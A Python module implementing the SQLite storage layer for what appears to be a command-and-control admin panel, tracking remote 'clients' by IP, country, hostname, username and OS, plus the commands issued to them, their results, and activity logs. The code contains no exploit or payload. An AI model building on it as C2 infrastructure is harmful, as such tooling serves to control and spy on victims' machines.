import sqlite3
import json
from datetime import datetime
import threading

class Database:
    def __init__(self, db_path='c2_admin.db'):
        self.db_path = db_path
        self.local = threading.local()
        self.init_db()
    
    def get_connection(self):
        if not hasattr(self.local, 'conn'):
            self.local.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.local.conn.row_factory = sqlite3.Row
        return self.local.conn
    
    def init_db(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        
        # Tabela de clientes
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT UNIQUE NOT NULL,
                ip_address TEXT,
                country TEXT,
                hostname TEXT,
                username TEXT,
                os_version TEXT,
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'online'
            )
        ''')
        
        # Tabela de comandos
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                result TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (client_id) REFERENCES clients(client_id)
            )
        ''')
        
        # Tabela de logs
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                action TEXT,
                details TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (client_id) REFERENCES clients(client_id)
            )
        ''')
        
        conn.commit()
    
    def add_or_update_client(self, client_data):
        conn = self.get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO clients (client_id, ip_address, country, hostname, username, os_version, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(client_id) DO UPDATE SET
                ip_address=excluded.ip_address,
                country=excluded.country,
                hostname=excluded.hostname,
                username=excluded.username,
                os_version=excluded.os_version,
                last_seen=excluded.last_seen,
                status='online'
        ''', (
            client_data['client_id'],
            client_data['ip_address'],
            client_data.get('country', 'Unknown'),
            client_data['hostname'],
            client_data['username'],
            client_data['os_version'],
            datetime.now()
        ))
        
        conn.commit()
    
    def get_all_clients(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM clients ORDER BY last_seen DESC')
        return [dict(row) for row in cursor.fetchall()]
    
    def get_client(self, client_id):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM clients WHERE client_id = ?', (client_id,))
        row = cursor.fetchone()
        return dict(row) if row else None
    
    def add_command(self, client_id, command, result=''):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO commands (client_id, command, result)
            VALUES (?, ?, ?)
        ''', (client_id, command, result))
        conn.commit()
        return cursor.lastrowid
    
    def get_commands(self, client_id, limit=50):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            SELECT * FROM commands 
            WHERE client_id = ? 
            ORDER BY timestamp DESC 
            LIMIT ?
        ''', (client_id, limit))
        return [dict(row) for row in cursor.fetchall()]
    
    def add_log(self, client_id, action, details=''):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO logs (client_id, action, details)
            VALUES (?, ?, ?)
        ''', (client_id, action, details))
        conn.commit()
    
    def get_logs(self, client_id=None, limit=100):
        conn = self.get_connection()
        cursor = conn.cursor()
        if client_id:
            cursor.execute('''
                SELECT * FROM logs 
                WHERE client_id = ? 
                ORDER BY timestamp DESC 
                LIMIT ?
            ''', (client_id, limit))
        else:
            cursor.execute('''
                SELECT * FROM logs 
                ORDER BY timestamp DESC 
                LIMIT ?
            ''', (limit,))
        return [dict(row) for row in cursor.fetchall()]

